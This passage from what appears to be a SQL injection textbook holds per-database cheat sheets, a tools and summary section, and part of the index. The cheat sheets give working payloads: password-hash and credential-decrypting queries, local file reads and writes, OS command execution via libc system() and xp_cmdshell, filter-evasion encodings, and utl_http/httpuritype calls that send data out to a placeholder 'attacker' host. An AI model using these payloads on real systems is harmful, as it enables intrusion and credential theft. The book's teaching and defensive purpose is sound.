(lob_loc, 1000, 1, buf); dbms_output.put_line(utl_raw.cast_to_varchar2(buf)); dbms_lob.close (lob_loc); end; ∗ via external table create table products_ext (prod_id number, prod_name varchar2(50), prod_desc varchar2(4000), prod_category varchar2(50), prod_category_desc varchar2(4000), list_price number(6,2), min_price number(6,2), last_updated date) organization external ( type oracle_loader default directory stage_dir access parameters (records delimited by newline badfile orahome:‘.rhosts’ logfile orahome:‘log_products_ext’ fields terminated by ‘,’ missing field values are null (prod_id, prod_name, prod_desc, prod_category, prod_category_desc, price, price_delta,last_updated char date_format date mask “dd- mon-yyyy”) ) location (‘data.txt’) ) parallel 5 reject limit unlimited; writing local files (pl/sql injection only) the following code examples will successfully execute only as pl/sql blocks. in most cases, you will need a direct connection to the database via a client such as sql ∗plus. writing local text files: utl_file create or replace directory ext as ‘c: \\’; declare v_file utl_file.file_type; begin v_file:= utl_file.fopen(‘ext’,‘aht.txt’, ‘w’); utl_file.put_line(v_file,‘first row’); utl_file.new_line (v_file); utl_file.put_line(v_file,‘second row’); utl_file.fclose(v_file); end; writing local binary files: utl_file create or replace directory ext as ‘c: \\’; declare fi utl_file.file_type; bu raw(32767); begin bu:=hextoraw(‘bf3b01bb8100021e8000b88200882780fb81750288d850e8060083c402cd20c35589e5b8010050 8d451a50b80f00508d5d00ffd383c40689ec5dc3558bec8b5e088b4e048b5606b80040cd21730231c08be55dc3 9048656c6c6f2c20576f726c64210d0a’); fi:=utl_file.fopen(‘ext’,‘hello.com’,‘ wb’,32767); utl_file.put_raw(fi,bu,true); utl_file.fclose(fi); end; / writing local files: dbms_advisor (oracle 10g and later) create directory mydir as ‘c:\\ ’; exec sys.dbms_advisor.create_file (‘this is the content’||chr(13)||‘next line’, ‘mydir’, ‘myfile.txt’); cracking database passwords depending on the version of the database, you can extract password hashes from the database by executing one of the following queries: select name, password from sys.user$ where type#>0 and length(password)=16; --des hashes (7- 10g) select name, spare4 from sys.user$ where type#>0 and length(spare4)=62; --sha1 hashes more than 100 oracle tables (depending on the installed components) contain password information. sometimes the passwords are available as clear text. the fol lowing examples will attempt to extract clear -text passwords: select view_username, sysman.decrypt(view_password) from sysman.mgmt_view_user_credentials; select credential_set_column, sysman.decrypt(credential_value) from sysman.mgmt_credentials2; select sysman.decrypt(aru_username), sysman.decrypt(aru_password) from sysman.mgmt_aru_credentials; oracle password hashes can then be cracked using a variety of freely available tools, such as worauthbf, john the ripper, gsaauditor, checkpwd, and cain & a bel. see the resources section at the end of this chapter for links to download each tool. postgresql cheat sheet postgresql is an open source database available for most operating system platforms. to download a comprehensive user manual visit www.postgresql.org/docs/manuals/ . enumerating database configuration information and schema table 11.19 lists sql statements used to extract key configuration inf ormation. table 11.20 lists the sql statements used to enumerate schema information. table 11.19 extracting the postgresql database configuration information data query version select version() current user select getpgusername(); select user; select current_user; select session_user; list users select usename from pg_user current user privileges select usename, usecreatedb, usesuper, usecatupd from pg_user data query database server host name select inet_server_addr(); table 11.20 extracting the postgresql database schema data query current database select current_database(); list databases select datname from pg_database; list tables select c.relname from pg_catalog.pg_class c left join pg_catalog.pg_namespace n on n.oid = c.relnamespace where c.relkind in (‘r’,’’) and pg_catalog.pg_table_is_visible(c.oid) and n.nspname not in (‘pg_catalog’, ‘pg_toast’); list columns select relname,a.attname from pg_class c, pg_namespace n, pg_attribute a, pg_type t where (c.relkind=‘r’) and (n.nspname = ‘public’) and (a.attrelid=c.oid) and (n.oid=c.relnamespace) and (a.atttypid=t.oid) and(a.attnum>0) and (not a.attisdropped); blind sql injection f unctions: postgresql table 11.21 lists functions that are useful when performing blind sql injection attacks. table 11.21 blind sql injection functions data query data query string length length() extract substring from a given string substring(string,offset,length) string ( ‘abc’ ) representation with no single quotes select chr(65)||chr(66)||chr(67); trigger time delay select pg_sleep(10); -- triggers a 10 second pause on version 8.2 and above attacking the database server: postgresql postgresql does not offer a built -in procedure for executing operating system commands. however, it is possible to import functions such as system() from an ex ternal .dll or shared object (.so) file. it is also possible to read local files via postgresql using the copy statement. system command execution for postgresql database servers prior to version 8.2, you can use the following sql to import the system func tion from the standard unix libc library: create or replace function system(cstring) returns int as ‘/lib/libc.so.6’, ‘system’ language ‘c’ strict; the system function can then be called by executing the following sql query: select system(‘command’); current versions of postgresql require that external libraries be compiled with the postgresql pg_module_magic macro defined. to achieve code execution via this method you will need to upload your own shared .so or .dll file with the appropriate pg_module_ magic macro enabled. see the following resource for further information: • www.postgresql.org/docs/8.2/static/xfunc -c.html#xfunc -c-dynload local file access local files can be read by the superuser account using the following sql. files are opened using the operating -system -level postgresql user account: create table filedata(t text); copy filedata from ‘/etc/passwd’; -- it is also possible to write local file s using the following sql. files are created using the operating -system -level postgresql user account: create table thefile(evildata text); insert into thefile(evildata) values (‘some evil data’); copy thefile (evildata) to ‘/tmp/evilscript.sh’; cracking d atabase passwords postgresql passwords are hashed using the md5 algorithm. the username is appended to the password before hashing takes place and the resultant hash has the characters md5 prepended to it. the following sql query will list usernames and pa ssword hashes from a postgresql database: select usename||‘:’||passwd from pg_shadow; an example entry for user sqlhacker is as follows: sqlhacker:md544715a9661408abe727f9963bf6dad93 a number of password cracking tools support md5 hashes, including mdcrack, john the ripper, and cain & abel. bypassing input validation filters you frequently can bypass input validation filters that rely on rejecting known bad characters and string literals by encoding your input. this section provides a reference of the most common encoding techniques used to bypass input validation filters that operate in this way. quote filters the single -quote character (‘) is synonymous with sql injection attacks. as such, the single quote character is often filtered or doubled up as a def ense mechanism. the idea behind this approach is to prevent the attacker from breaking out of quote -delimited data. unfortunately, this strategy fails when the vulnerable user input is a numeric value, and therefore is not delimited using quote characters. when quote characters are being filtered or sanitized you will need to encode string values to prevent them from being corrupted by the filter. table 11.22 lists the alternative methods for representing the query select ‘abc’ within each of the most popular database platforms. table 11.22 representing strings without quote characters platform query microsoft sql server select char(0x41) + char(0x42) + char(0x43); mysql server select char(65,66,67); select 0x414243; oracle select chr(65) || chr(66) || chr(67) from dual; select concat(chr(65),concat(chr(66),chr(67))) from dual; select upper((select substr(banner,3,1)||substr(banner,12,1)||substr(banner,4,1) from v$version where rownum=1)) from dual; postgresql select chr(65)||chr(66)||char(67); microsoft sql server also allows you to build your query within a variable and then call exec to execute it. in the following example, we have created a variable named @q and placed the query select ‘abc ’ into it via a hex -encoded string: declare @q varchar(8000) select @q=0x53454c454354202741424327 exec(@q) you can adopt this technique to execute any query without submitting any quote characters to the application. you can use the following perl script to automatically encode sql statements using this technique: #!/usr/bin/perl print “enter sql query to encode:”; $teststr=<stdin>;chomp $teststr; $hardcoded_sql = ‘declare @q varchar(8000)’. ‘select @q=0x∗∗∗’ . ‘exec(@q)’; $prepared = encode_sql($teststr); $hardcoded_sql =∼ s/\\∗\\∗\\∗/$prepared/g; print “\\ n[∗]-encoded sql:\\ n\\n”; print $hardcoded_sql .“ \\n”; sub encode_sql{ @subvar=@_; my $sqlstr =$subvar[0]; @ascii = unpack(“c ∗”, $sqlstr); foreach $line (@ascii) { $encoded = sprintf(‘%lx’,$line); $encoded_command .= $encoded; } return $encoded_command; } http encoding you can sometimes bypass input validation fi lters that reject known bad characters (often referred to as blacklisting) by encoding your input using exotic encoding standards or via double encoding. table 11.23 lists common sql metacharacters in a number of encod ed formats. table 11.23 encoded sql metacharacters character encoded variant s ‘ %27 %2527 %u0027 %u02b9 %ca%b9 “ %22 %2522 %u0022 %uff02 %ef%bc%82 ; %3b %253b %u003b %uff1b character encoded variant s %ef%bc%9b ( %28 %2528 %u0028 %uff08 %ef%bc%88 ) %29 %2529 %u0029 %uff09 %ef%bc%89 [space] %20 %2520 %u0020 %ff00 %c0%a0 troubleshooting sql injection attacks table 11.24 lists some of the common challenges and errors that are frequently encountered when attempting to exploit a sql injection flaw across various platforms . table 11.24 troubleshooting sql injection reference error/challenge solutio n challenge performing a union select attack where the original query is retrieving a column of type image error message image is incompatible with int / the image data type cannot be selected as distinct because it change your union select stateme nt to read union all select . this resolves the problem with union select attempting to perform a compare operation against an image data type.for example: union all select null, null, null error/challenge solutio n is not comparable. challenge injecting into an order by clause your injected data is being placed to the right -hand side of an order by clause. many of the usual tricks such as union select will be unsuccessful. in this example, the following sql query is being executed where the attacker’s data is your injection point: select ∗ from products group by attackers_data desc microsoft sql server microsoft sql server supports stacked queries using the semicolon character (;) to begin each new query. a variety of attacks, such as time -delay -based data retrieval and the execution of extended s tored procedures, can be conducted in this way. order by 1; exec master..xp_cmdshell ‘cmd’ microsoft sql server can also be exploited to return query result data via error messages. when injecting into an order by clause the following syntax can be used: order by (1/(@@version)); -- return the version order by 1/(select top 1 name from sysobjects where xtype=‘u’); -- return name from sysobjects mysql server time -delay -based blind sql injection techniques can be used within an order by clause. the following example will trigger a time delay if the current user is root@localhost : order by(if((select user()= ‘root@localhost’),sleep(2),1)); oracle the utl_http package can be used to establish outbound http connections over any transmission control protocol (tcp) port of the attacker’s choosing. the following order by clause establishes an http connection over port 1000 to the host attacker; the http request contains the oracle version banner within the request path: order by utl_http.request(‘http://attacker:1000/ ’||(select banner from v$version where error/challenge solutio n rownum=1)) the following order by clause will raise an error containing the oracle version banner: order by utl_inaddr.get_host_name ((select banner from v$ version where rownum=1)) postgresql postgresql can be exploited to return query result data via error messages. when injecting into an order by clause the following syntax can be used: order by (select cast((select version())::text as numeric)) challen ge utl_http does not work because the public privilege was removed. error message ora -00904 invalid identifier many oracle security guides recommend that the public privilege be removed from the utl_http package. however, many overlook the fact that the object type httpuritype can be used to achieve the same aim and is also accessible to public. select httpuritype( ‘http://attacker:1000/ ’|| (select banner from v$version where rownum=1) ).getclob() from dual challenge utl_inaddr does not work. there could be various reasons, such as access control lists (acls) in version 11, privileges have been revoked, and java is not installed. error message ora -00904 invalid identifier ora -24247 network access denied by ac cess control list (acl) – 11g use a different function where you can control the content of the error message. here is a small list of candidates depending on the database version and its installed components: order by ordsys.ord_dicom.getmappingxpath(( select banner from v$version where rownum=1),null,null) order by sys.dbms_aw_xml.readawmetadata(( select banner from v$version where rownum=1),null) order by ctxsys.drithsx.sn((select banner from v$version where rownum=1),user) order by ctxsys.ctx_report.token_type(user, error/challenge solutio n ora -29540 oracle/plsql/net/internetaddress (select banner from v$version where rownum=1)) challenge you receive an “illegal mix of collations” message when performing a union select attack against a mysql database. error message illega l mix of collations (latin1_swedish_ci,implicit) and (utf8_general_ci,sysconst) for operation ‘union’ this error can be overcome using the cast function. for example: union select user(),null,null; becomes: union select cast(user() as char),null,null; challenge you receive a “collation conflict” message when performing a union select attack against a microsoft sql server database. error message cannot resolve collation conflict for column 2 in select statement. one way to overcome this error is to rea d the collation property from the database and then use it within the query. in the following example, we are performing a union all select query to retrieve the name column from the sysobjects table. step 1: retrieve the collation value union all select serverproperty(‘collation’),null from sysobjects in this example, the collation property is set to sql_latin1_general_cp1_ci_as. step 2: implement the collation value within the union select union all select 1,name collate sql_latin1_general_cp1_ci_as,null from sysobjects sql injection on other platforms this book focuses on the four most popular databases: microsoft sql server, mysql, oracle, and postgresql. this section is intended to provide a quick reference for other, less common platforms, such as db2, informix, and ingres. db2 cheat sheet the db2 database server from ibm was historically an uncommon database platform to find integrated with a web application, however the linux, unix and windows edition (db2 luw) is becoming increasingly popular. as such, if you do encounter a sql injection flaw within a db2 -based application this section will help you exploit it. enumerating database configuration information and schema table 11.25 lists sql statements used to extract key configuration information. table 11.26 lists the sql statements used to enumerate schema information. table 11.25 extracting db2 database configuration information data query version select versionnumber, version_timestamp from sysibm.sysversions; current user select user from sysibm.sysdummy1; select session_user from sysibm.sysdummy1; select system_user from sysibm.sysdummy1; list users select grantee from syscat.dbauth; current user privileges select ∗ from sysc at.dbauth where grantee =user; select ∗ from syscat.tabauth where grantee =user; select ∗ from syscat.tabauth; table 11.26 extracting db2 database schema data query current database select current server from sysibm.sysdummy1; list databases select schemaname from syscat.schemata; list tables select name from sysibm.systables; list columns select name, tbname, coltype from sysibm.syscolumns; blind sql injection functions: db2 table 11.27 lists functions that are useful when performing blind sql injection attacks. table 11.27 blind sql injection functions data query string length length() extract substring from a given string substring(string,offset,length) from sysibm.sysdummy1; string ( ‘abc’ ) representation with no single quotes select chr(65)||chr(66)||chr(67); informix cheat sheet the informix database server is distributed by ibm and is not commonly encountered when compared to other database platforms. the following reference should help if you encounter an informix server in the wild. enumerating database configuration information and schema table 11.28 lists sql statements used to extract key configuration information. table 11.29 lists the sql statements used to enumerate schema information. table 11.28 extracting informix database configuration information data query version select dbinfo(‘version’, ‘full’) from systables where tabid = 1; current user select user from systables where tabid = 1; list users select usertype,username, password from sysusers; current user privileges select tabname, tabauth, grantor, grantee from systabauth join systables on systables.tabid = systabauth.tabid database server host name select dbinfo(‘dbhostname’) from systables where tabid=1; table 11.29 extracting informix database schema data query current database select dbservername from systables where tabid = 1; list databases select name, owner from sysdatabases; list tables select tabname from systables; select tabname, viewtext from sysviews join systables data query on systables.tabid = sysviews.tabid; list columns select tabname, colname, coltype from syscolumns join systables on syscolumns.tabid = systables.tabid; blind sql injection functions: informix table 11.30 lists fu nctions that are useful when performing blind sql injection attacks. table 11.30 blind sql injection functions data query string length length() extract substring from a given string select substring(‘abcd’ from 4 for 1) from systables where tabid = 1; -- returns ‘d’ string ( ‘abc’ ) representation with no single quotes select chr(65)||chr(66)||chr(67) from systables where tabid = 1; ingres cheat sheet the ingres database is an open source database available for all major operating systems. ingres is one of the least popular databases to find integrated with a web application. for further information and ingres tutorials see http://ariel.its.unimelb.edu.au/~yuan/ingres.html. enumerating database configuration information and schema table 11.31 lists sql statements used to extract key configuration infor mation. table 11.32 lists the sql statements used to enumerate schema information. table 11.31 extracting ingres database configuration information data query version select dbmsinfo(‘_version’); current user select dbmsinfo(‘system_user’); select dbmsinfo(‘session_user’); list users select name, password from iiuser; current user privileges select dbmsinfo(‘select_syscat’); select dbmsinfo(‘db_privileges’); select dbmsinfo(‘current_priv_mask’); select dbmsinfo(‘db_admin’); select dbmsinfo(‘security_priv’); select dbmsinfo(‘create_table’); select dbmsinfo(‘create_procedure’); table 11.32 extracting ingres database configuration data query current database select dbmsinfo(‘database’); list tables select relid, relowner, relloc from iirelation where relowner != ‘$ingres’; list columns select column_name, column_datatype, table_name, table_owner from iicolumns; blind sql injection functions: ingres table 11.33 lists functions that are useful when performing blind sql injection attacks. table 11.33 blind sql injection functions data query string length length(); extract substring from a given string select substr(string, offset, length); -- string ( ‘abc’ ) representation with no single quotes select chr(65)||chr(66)||chr(67); sybase cheat sheet sybase and microsoft sql server share a common heritage, and as such many of the approaches used with microsoft sql server will also work with sybase, often with little or no changes to the syntax of the commands to use. enumerating database configuration information and schema table 11.34 lists sql statements used to extract key configuration information. table 11.35 lists the sql statements used to enumerate schema information. table 11.34 extracting sybase database configuration information data query version select @@version; current user select username(); select suser_name(); select user; list users select name from master..syslogins; data query current user privileges select show_role(); exec sp_helprotect <user>; table 11.35 extracting sybase database schema data query current database select db_name(); list databases select name from master..sysdatabases; list tables tables within the current database: select name from sysobjects where type=‘u’; select name from sysobjects where type=‘v’;-- views tables within the master database: select name from master..sysobjects where type=‘u’; select name from master..sysobjects where type=‘v’; list columns column names for the tblusers table within the current database: select name from syscolumns where id=object_id(‘tblusers’); column names for the tblusers table within the admin database: select name from admin..syscolumns where id=object_id(‘admin..tblusers’); blind sql injection functions: sybase table 11.36 lists functions that are useful when performing blind sql injection attacks. table 11.36 blind sql injection functions data query string length len(); extract substring from a given string substring(string,offset,length); string ( ‘abc’ ) representation with no single quotes select char(65) + char(66) + char(67); microsoft access microsoft access databases do not scale well with enterprise applications, and therefore are usually encountered only when the application has minimal database requirements. brett moore of insomniasec.com has publ ished an excellent paper on sql injection with microsoft access which you can find here: • www.insomniasec.com/publications/access -through- access.pdf resources this section provides a list of links to further reading materials and tools to assist you in discovering, exploiting, and preventing sql injection vulnerabilities. sql injection white papers • “advanced sql injection” by victor chapela: www.owasp.org/index.php/image:advanced_sql_injection.ppt • “advanced sql injection in sql server applications” by chris anley: www.ngssoftware.com/papers/advanced_sql_injection.pdf • “buffer truncation abuse in .net and microsoft sql server” by gary o’leary -steele: http://scanner.sec -1.com/resources/bta.pdf • “access through access” by brett moore: www.insomniasec.com/publications/access -through -access.pdf • “time -based blind sql injection with heavy queries” by chema alonso: http://technet.microsoft.com/en -us/library/cc512676.aspx sql injection cheat sheets • pentestmonkey.com sql injection cheat sheets for oracle, micros oft sql server, mysql, postgresql, ingres, db2, and informix: http://pentestmonkey.net/cheat- sheets/ • michaeldaw.org sql injection cheat sheets for sybase, mysql, oracle, postgresql, db2, and ingres: http://michaeldaw.org/sql- injection -cheat -sheet/ • ferruh mavituna cheat sheets for mysql, sql server, postgresql, and oracle: http://ferruh.mavituna.com/sql -injection -cheatsheet -oku/ • ferruh mavituna cheat sheets for oracle: http://ferruh.mavituna.com/oracle -sql-injection -cheat -sheet -oku/ sql injection exploit tools • absinthe is a windows gui -based exploit tool that supports microsoft sql server, oracle, postgresql, and sybase using both blind and error -based sql injection: www.0x90.org/releases/absinthe/ • sqlbrute is a time - and error -based blind sql injection tool that supports microsoft sql server and oracle: https: //github.com/gdssecurity/sqlbrute • bobcat is a windows gui -based tool that supports microsoft sql server exploitation: http://web.mac.com/nmonkee/pub/bobcat.html • bsql hacker is a relatively new player in the sql injection exploit world. the tool is a windows -based gui application that supports microsoft sql server, oracle, and mysql. bsql hacker supports blind and error -based sql injection techniques: http://labs.portcullis.co.uk/application/bsql -hacker/ • sqlmap is considered by many to be the best sql injection exploit tool currently available: http://sqlmap.sourceforge.net/ • sql ninja is a microsoft sql injection tool focused on gaining code execution and written in perl: http://sqlninja.sourceforge.net/ • squeeza was released as part of a blackhat presentation. it focuses on altern ative communication channels. squeeza supports microsoft sql server: www.sensepost.com/research/squeeza/ password cracking tools • cain & abel: www.oxid.it • wora uthbf: www.soonerorlater.hu/index.khtml?article_id=513 • checkpwd: www.red -database- security.com/software/checkpwd.html • john the ripper: www.openwall.com/john/ solutions fast track structured query language (sql) primer • sql comprises a feature- rich set of statements, operators, and clauses designed to interact with a database server. the most common sql statements are select , insert , update , delete, and drop . the majority of sql injection vulnerabilities occur when user supplied data is included with the where clause portion of a select statement. • the update and delete statements rely on a where clause to determine which records are modified or deleted. whe n injecting sql into either an update or a delete statement it is important to understand how your input could affect the database. avoid injecting or 1=1 or any other condition that returns true into either of these statements. • the union operator is use d to combine the results of two or more select statements. union select is frequently used to exploit sql injection vulnerabilities. sql injection quick reference • identifying the database platform is an important step when attempting to exploit a sql injection vulnerability. triggering a measurable time delay is a reliable method of accurately identifying the database platform. • when exploiting sql injection vulnerabilities you are often restricted to returning one column from one row at a time. you can overcome this restriction by concatenating the results from multiple columns and rows into a single string. bypassing input validation filters • you often can circumvent input validation filters that are designed to handle the single -quote character (‘) by representing string values using character functions. for example, char(65,66,67) is equivalent to ‘abc’ on microsoft sql server. • http encoding variants such as unicode and overlong utf -8 can sometimes be used to bypass input validation filters. • input validation filters that rely on rejecting known bad data, often referred to as blacklisting, are frequently flawed. troubleshooting sql injection attacks • when exploiting a sql injection flaw using union select you may encounter type clash errors when im age data type columns are included within the original query. to overcome this common obstacle use union all select . • microsoft sql server supports stacked queries using the semicolon character to begin each new query. • the oracle database server includes the utl_http package that you can use to establish outbound http connections from the database server host. it is possible to abuse this package to extract database data via http connections to any tcp port. sql injection on other platforms • the most co mmonly encountered database platforms are microsoft sql server, oracle, and mysql. this chapter included a sql injection cheat sheet for db2, informix, and ingres databases. index a abstract syntax tree (ast), 127 android application code content -providers, 111–112, 115, 116 parameterized statements, 378 sqlitedatabase, 112–114 sqlitequerybuilder, 112–114 sqlma p, 112–114 webcontentresolver, 112 application program interfaces (apis), 371 aspect -oriented progra mming (aop), 424 asprox botnet, 73–74 ast. see abstract syntax tree (ast) automated source code review abstract syntax tree (ast), 127 appcodescan, 130 appscan source edition, 135 codepro analytix, 132 codesecure, 135 command -line utilities, 126–127 control flow graph (cfg), 127 klocwork solo, 135–136 lexical analysis, 127 microsoft analyzer, 131 microsoft code analysis tool .net (cat.net), 131–132 mysql_query( ) function, 127 owasp lapse+ project, 130–131 php scripts, vulnerabilities in, 132 pixy, 129–130 rips, 132 source code analyzers (scas), 133–134 static analysis, 134–135 teachable static analysis workbench (tesa), 132–133 yet another source code analyzer (yasca), 129 automated sql injection discovery database error, 76 get and post requests, 76 hp scrawlr, 80–82 hp webinspect authentication mechanisms, 77 hewlett -packard, 77 testing string, 78 ibm rational appscan, 79–80 paros proxy, 83–85 sqlix, 82–83 tasks, 76 zed attack proxy, 83–85 automated techniques absinthe configuration tab, 277 gpl tool, 276 injectable parameter, 277 –278 bsql hacker extracting database login, 280 features, 278 request and injection tab, 279 selecting database plugin, 280 url textbox, 279 sqlbrute false statement, 281 python interpreter, 281 sqlninja extraction of username, 284 sql server installations, 283 uploading dns helper, 284 squeeza dns channel, 284–285, 285–286 get and post parameters, 286 b bcp. see bulk copy program (bcp) blind sql inje ction techniques channels, 249 inference techniques ascii( ) function, 244 bit string, 248 bitwise operations, 247 extracting data method, 243–244 one bit information, 239 sql server database, 240 status parameter, 242 substring( ) function, 242–243 t-sql, 247 integer value, 248 bobcat, 225–226 bsql active session, 227 databases, 226 remote database, 228 built-in stored procedures, 371 bulk copy program (bcp), 311 bypassing input validation filters http encoding, 521, 522 quote filters, 520–521 c c# applications coding behavior recognition, 98–99 dangerous functions, 103–104 data process, 110–111 canonicalization approaches ascii equivalents, 397 framework, 398 input normalization, 397 input validity, 398 normalization process, 397 working with unicode input, 397–399 cat.net. see microsoft code analysis tool .net (cat.net) channels database connections openrowset command, 267, 268 pl/pgsql functions, 269 transmission control protocol (tcp), 267 dns exfiltration advantages, 269 get_host function, 269–270 stored procedure, 271, 272 universal naming convention (unc), 271 varbinary parameter, 271–272 xp_cmdshell procedure, 270 zone attacker.com, 273 e-mail exfiltration, 273 http exfiltration httpuritype package, 273–274 oracle function, 274–275 order by clause, 275 icmp ex filtration, 276 client -side sql injection attacking client -side databases, 356–358 local database, 355–356 clr. see common language runtime (clr) cms. see content management system (cms) code -level defenses application program interfaces (apis), 371 canonicalization approaches ascii equivalents, 397 framework, 398 input normalization, 397 input validity, 398 normalization pr ocess, 397 working with unicode input, 397–399 design techniques avoiding obvious object names, 403–404 database honeypots, 404 handling sensitive data, 401–403 secure development resources, 404–405 using abstraction layers, 400–401 using stored procedures, 399–400 domain driven security (dds) concept, 366–368 login function, 366 encoding output, database, 387–396 java database connectivity (jdbc), 372 nosql injection, 395–396 parameterized statements .net (c#), 373–376 advantage, 371 dynamic string building, 371 html5 browser storage, 378–379 java, 372–373 mobile apps, 377–378 php, 376–377 pl/sql, 377 statements, 372 secure coding, 365 validating input .net, 386 blacklisting, 383–384 html 5, 387 java, 384–386 mobile apps, 387 php, 386–387 whitelisting, 379–383 column privileges, 185–187 common l anguage runtime (clr), 301–303 common weakness scoring system (cwss), 9 confirming and recovering sql injection attack actions performed by attacker during incident, 474–475 data involved assessment, 473–474 dynamic payloads, 479– 481 incident containment, 472–473 investigations digital artifacts, 446–472 forensically sound practices, 444–446 notification of appropriate individuals, 474 payload of attack, 476–477 static payloads, 477–479 confirming and ter minating sql injection benchmark function, 75 comments back -end server, 70 database concatenation operators, 69, 70 exploitation, 68 multiline comments, 68, 69 testing string, 70 database comment syntax, 65–67 dbms_lock.sleep( ) function, 76 executing multiple statement asprox botnet, 73–74 denial of service (dos) attacks, 73 get parameter, 72 group by technique, 71 server -side cursors, 70 testing string, 73 union statements, 71–72 update statement, 71 where clause, 72 inline function numeric values, 63–65 strings, 59–63 numbers and strings, 58– 59 statement, 65 time delays, 74–76 trial- and-error process, 58 content management system (cms) cmsusers table, 8 login.php script, 7–8 php script, 3, 8 web application, 7 create procedure privilege cursor injection, 202–203 sys.kupp$proc, 203 weak permissions, 203–204 cross -site scripting (xss), 77 d database administrators (dbas), 290, 359 database -driven web applications three -tier system, 2, 3 database execution plan access execution plans, 458–461 limitations, 461–462 microsoft sql server, 458–459 mysql, 459–460 observe within cached execution plans, 455–458 oracle, 459 postgresql, 460–461 database management system (dbms), 290 database queries inference methods, 249 mysql delays benchmark( ) function, 250–251 binary search inference exploits, 251–252 bit-by-bit inference exploits, 252 sleep( ) function, 250–251 oracle delays alonso, 257 dbms_lock package, 257 postgresql delays binary search inference exploits, 254 bit-by-bit inference exploits, 254 pg_sleep( ) function, 252–253 pl/pgsql, 253 sql server delays binary search inference exploits, 256 bit-by-bit inference exploits, 256–257 waitfor delay keyword, 255 database security application data, locking down audit trail maintenance, 428–431 least-privileged database login, 426 oracle error triggers, 429 –431 public permissions revoking, 427 segregated database logins, 426–427 stored procedures, 427 strong cryptography, 427 –428 database server, locking down ad hoc query restriction, 432 least-privileged operating system account, 433 patched database server software, 433–434 sql server/oracle database server versions, 433 strengthen controls, 432– 433 system objects, 431–432 database stored procedures, 371 db2 cheat sheet blind sql injection functions, 526, 527 database configuration information and schema, 525 dbas. see database administrators (dbas) dbms_lock.sleep( ) function, 76 dds. see domain driven security (dds) deployment considerations network access control configuration, 439 unnecessary information leakage configuration techniques , 435 dns lookups, dummy host names, 436–437 empty default web site, 436 html noindex meta tag, 437 search engine hacking, limit discovery, 437–438 suppress error messages, 434–436 web services description language (wsdl) information, 438 wildcard ssl certificates, 437 web and database servers, separate hosts, 439 web server logs, verbosity, 438–439 design techniques abstraction layers, 399–40 0 avoiding obvious object names, 403–404 database honeypots, 404 handling sensitive data database, 401–403 incident response, 402 secure development resources notable projects, 405 red-database -security, 405 stored procedures access control, 399 web application, 400 digital artifacts database execution plan access execution plans, 458–461 limitations, 461–462 microsoft sql server, 458–459 mysql, 459–460 observe within cached execution plans, 455–458 oracle, 459 postgresql, 460–461 database object timestamps microsoft sql server, 469 mysql, 470–471 oracle, 469–470 postgresql, 471–472 transaction log analysis, 463–468 microsoft sql server, 463–465 mysql, 466–468 oracle, 465–466 postgresql, 468 web server log files, 446 –452 dns. see domain name system (dns) domain driven security (dds) concept, 336–337 login function, 366 domain name system (dns), 436–437 dynamic link library (dll), 313–314 dynamic query, 371 dynamic string building techniques built-in command, 16 error handling, 18–19 escape characters handling, 14–15 handling types, 15–17 idiosyncrasies of, 15 multiple submissions handling, 19–21 parameterized queries, 13 –14 php code, 14 query assembly handling, 17–18 string -building techniques, 13–14 e e-commerce appl ication, 2, 6 e-mail exfiltration, 273 microsoft sql server database mail account, 213–214 e-mailing subsystems, 211–212 procedure, 213–214 sp_send_dbmail , 213 oracle, 214–215 enterprise security application program interface (esapi), 385 exploit technique s arbitrary data, 167, 168 automated exploitation bobcat, 225–226 bsql, 226–227 other tools, 227–228 sqlmap, 224–225 black -box attack approach, 140 conditional statements content -based approach, 165 database server technologies, 159 error -based approach, 163–165 methods, 158–159 time-based approach, 159–163 database schema enumeration mysql, 178–183 oracle, 184–188 postgresql , 183–184 sql server, 175–178 database server blind fingerprint, 149–150 internet information server (iis), 143–144 non-blind fingerprint, 144–149 e-commerce application, 141 errors application error, 169 generic error message, 170 group by clause, 170 hybrid attacks, 169 trigger, 169 verbose error messages, 168 escalating privileges brute -force approach, 198–199 create procedure privilege, 202–204 oracle, 200–202 sql server, 194–200 html code, 141 injecting into “insert” queries ascii( ) function, 191 case clause, 192 concat function, 190 corrupt production data, 188 data manipulation language (dml), 188 generating insert errors, 191–193 inserting user determined data, 188–191 other scenarios, 193–194 scalar subqueries , 192 mobile devices android- based devices, 219–220 content providers, 219–221 inter process communication (ipc), 219–220 selid parameter, 222 sqlite_master table, 222 webcontentresolver application, 220, 221–222 oracle error messages access control list (acl) system, 173 concat function, 171 error -controllable messages, 173 multiple rows, 173 output approaches, 173 select statement, 171 sql*plus command line, 171 stragg (11g+) , 173 utl_inadd, 170 utl_inaddr.get_host_name function, 171 oracle from web applica tions, 142–143 out-of-band communication e-mail, 211–215 file system, 215–219 http/dns, 215 password hashes hash modification, 205 mysql, 206 oracle, 207–211 postgresql, 206–207 sql server, 204–206 stacked queries, 142–143 strings, 165–167 union statement s data types, 153–158 matching columns, 151–153 syntax, 150–151 victim.com, 141–142 vulnerable parameters, 140 exploitation automated techniques absinthe, 276–278 bsql hacker, 278–280 sqlbrute, 280–282 sqlninja, 283–284 squeeza, 284–286 channels database connections, 267–269 dns exfiltration, 269–273 e-mail exfiltration, 273 http exfilt ration, 273–276 icmp exfiltration, 276 client -side sql injection attacking client -side databases, 356–358 local database, 355–356 finding and confirmation blind sql injection techniques, 239–249 forcing generic errors, 235 injecting queries, 235 spitting and balancing, 235–237 subquery placeholders, 238 response -based techniques mysql, 259–260 one bit information, 264–267 oracle, 263–264 postgresql, 260–261 sql server, 261–263 time-based techniques database queries, 249–257 inference considerations, 257–258 f finding and confirmation blind sql injection techniques channel techniques, 249 inference techniques, 239–243 scenarios, 237–239 forcing generic errors, 235 four-tier architecture, 5–6 injecting queries, 235 spitting and balancing author parameter, 236 id parmeter, 235–236 string parameter, 236–237 g get parameters, versus post parameters, 7 get request, 17 h html5 communities, 13 http exfiltration httpuritype package, 273–274 oracle function, 274–275 order by clause, 275 hybrid attacks cross -site scripting (xss), 358–359 exploiting authenticated vulnerabilities, 360–361 leveraging captured data, 358 operating system commands, oracle, 359–360 i icmp exfiltration, 276 inference techniques ascii( ) function, 244 bitstring, 248 bitwise operations, 247 extracting data method, 243–244 one bit informati on, 239 sql server database, 240 status parameter, 242 substring( ) function, 242–243 t-sql, 247 informix cheat sheet blind sql injection functions, 527–528 database configuration information and schema, 526 ingres cheat sheet blind sql injection functions, 528–529 database configuration informa tion and schema, 528, 529 injection flaws. see sql injection flaws inline function numeric values exploitation, 64 principles, 65 single -quote delimiters, 64 uid parameter, 63 unique identification, 63 visual representation, 64 strings finding process, 60 or condition, 61 sql statement, 59–63 unclosed quotation markerror, 61 input filters 